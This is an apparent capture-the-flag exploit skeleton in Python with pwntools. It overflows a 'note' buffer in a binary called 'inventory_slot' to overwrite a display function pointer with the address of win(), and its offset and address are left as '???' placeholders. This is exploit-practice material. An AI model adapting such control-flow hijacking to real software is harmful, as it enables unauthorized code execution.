#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./inventory_slot', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = ???      # bytes from start of `note` to slot->display
WIN               = ???      # address of win() in the binary

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=2).decode(errors='replace'))
